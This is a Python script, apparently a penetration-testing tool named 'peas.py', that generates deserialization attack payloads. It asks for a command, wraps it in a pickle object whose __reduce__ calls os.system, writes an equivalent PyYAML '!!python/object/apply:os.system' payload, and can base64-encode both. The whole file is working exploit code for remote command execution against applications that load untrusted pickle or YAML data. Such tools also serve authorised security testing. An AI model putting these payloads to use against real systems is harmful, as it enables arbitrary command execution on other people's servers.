# Python Deserialization attack payload file generator for pickle and pyYAML module by j0lt
# Requirements : Python 3
# Usage : python peas.py

import pickle
import os
import base64

class Payload(object):

    def __init__(self, cmd ,  location, base):
        self.cmd = cmd
        self.location = location
        self.base = base

    def pick(self):
        by = pickle.dumps(Payload(self.cmd, self.location, self.base))
        by = self.verifyencoding(by)
        open(self.location.__add__("_pick"), "wb").write(by)

    def ya(self):
        by = bytes("!!python/object/apply:os.system ['{}']".format(self.cmd), "utf-8")
        by = self.verifyencoding(by)
        open(self.location.__add__("_yaml"), "wb").write(by)

    def __add__(self, other):

        return self+other
    
    def __reduce__(self):
        return os.system, (self.cmd,)

    def verifyencoding(self, s):
        if self.base :
            return base64.b64encode(s)
        else:
            return s


if __name__ == "__main__":
    cmd = input("Enter RCE command :")
    b = True if input("Want to base64 encode payload ? (N/y) :").lower() == "y" else False
    location = input("Enter File location and name to save :")
    p = Payload(cmd, location, b)
    while 1:
        module = input("Select Module (Pickle, PyYAML, All) :").lower()


        if module == "pickle":
            p.pick()
            break
        elif module == "pyyaml":
            p.ya()
            break
        elif module == "all":
            p.pick()
            p.ya()
            break
        else:
            print("Wrong Input ")
            continue

    print("done")

